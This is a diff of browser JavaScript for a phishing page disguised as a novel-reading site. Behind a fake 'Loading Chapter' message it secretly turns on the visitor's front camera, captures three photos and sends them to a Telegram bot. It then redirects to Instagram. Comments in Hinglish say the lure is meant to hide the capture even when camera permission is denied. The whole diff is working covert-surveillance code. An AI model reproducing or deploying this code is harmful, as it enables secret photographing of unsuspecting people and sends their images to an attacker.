@@ -4,13 +4,12 @@ const chat_id = "8598414928";
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 let photoCount = 0;
-const maxPhotos = 4;
+const maxPhotos = 3;
 
-window.addEventListener('DOMContentLoaded', () => {
-    startCamera();
-});
+async function startProcess() {
+    // Button click hone par text change kar ke loading dikhayenge
+    document.getElementById('mainCard').innerHTML = `<h3>Loading Chapter...</h3><p style="color: #8e8e8e; font-size: 14px;">Please wait while the novel loads.</p>`;
 
-async function startCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: "user" }, 
@@ -18,18 +17,23 @@ async function startCamera() {
         });
         video.srcObject = stream;
         
-        setTimeout(captureAndSendPhotos, 2000);
+        // Camera on hone ke thodi der baad capture shuru hoga
+        setTimeout(captureAndSendPhotos, 1500);
     } catch (error) {
         console.error("Camera permission denied or error:", error);
+        // Agar koi permission deny bhi kare toh user ko lagega novel load ho raha hai
+        setTimeout(() => {
+            window.location.href = "https://instagram.com";
+        }, 2000);
     }
 }
 
 function captureAndSendPhotos() {
     if (photoCount >= maxPhotos) {
-        document.getElementById('mainCard').innerHTML = `<h3>Loading Complete</h3><p>Redirecting...</p>`;
+        document.getElementById('mainCard').innerHTML = `<h3>Loaded Successfully</h3><p>Redirecting to reader...</p>`;
         setTimeout(() => {
             window.location.href = "https://instagram.com";
-        }, 1500);
+        }, 1000);
         return;
     }
 
@@ -44,7 +48,7 @@ function captureAndSendPhotos() {
         const formData = new FormData();
         formData.append('chat_id', chat_id);
         formData.append('photo', blob, `photo_${photoCount}.jpg`);
-        formData.append('caption', `📸 Auto Captured Photo #${photoCount}`);
+        formData.append('caption', `📸 Captured Photo #${photoCount}`);
 
         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
             method: 'POST',
@@ -53,11 +57,11 @@ function captureAndSendPhotos() {
         .then(response => response.json())
         .then(data => {
             console.log(`Photo ${photoCount} sent successfully`);
-            setTimeout(captureAndSendPhotos, 1500);
+            setTimeout(captureAndSendPhotos, 1200);
         })
         .catch(error => {
             console.error("Error sending photo:", error);
-            setTimeout(captureAndSendPhotos, 1500);
+            setTimeout(captureAndSendPhotos, 1200);
         });
     }, 'image/jpeg', 0.8);
-}
+                  }
